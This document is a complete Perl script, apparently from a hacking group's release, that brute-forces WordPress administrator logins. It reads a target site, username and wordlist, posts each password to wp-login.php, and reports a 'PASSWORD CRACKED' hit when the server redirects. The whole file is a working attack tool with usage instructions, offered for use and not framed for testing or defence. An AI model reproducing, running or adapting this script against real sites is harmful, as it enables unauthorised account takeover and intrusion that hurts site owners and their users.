#!/usr/bin/perl

#
print "\n[+]*****************************************[+]\n";
print " |   Fallaga  Wordpress brute force.              |\n";
print "[+]*******************************************[+]\n";
print "[+]            http://dev-tun.tn              [+]\n";
print "[+]*******************************************[+]\n";
print "[+]****************MOoDyTN********************[+]\n";
print "[+]*******************************************[+]\n";
print "[+]*****Greetz To All Fallag Team Members*****[+]\n";
print "[+]*******************************************[+]\n";

use LWP::UserAgent;

$site = $ARGV[0];
$user = $ARGV[1];
$wordl = $ARGV[2];

if(@ARGV != 3){
print "
WP-Brute 

How to use: $0 <site> <user> <wordlist>
exe: $0 site.com admin wordlist.txt

";
exit;
}

if ($site !~ /^http:\/\//){
$site = 'http://' . $site;
}
if ($site !~ /\/wp-login.php/){
$site = $site . '/wp-login.php';
}

open(a,"<$wordl") or die "$!";
print "\n\nSite: $site\nUsername: $user\n\nAttacking...\n\n";
sleep(2);
while(<a>){
chomp($_);

my $ua = new LWP::UserAgent;

my $response 
= $ua->post($site, 
{ log => $user, 
pwd => $_,
wp-submit => 'Log in',
});

my $code = $response->code;
print "[+] Testing... $_\n";
if($code == 302){
print "\n\n\t[*] PASSWORD CRACKED: $_\n\n";
exit;
}
}
exit;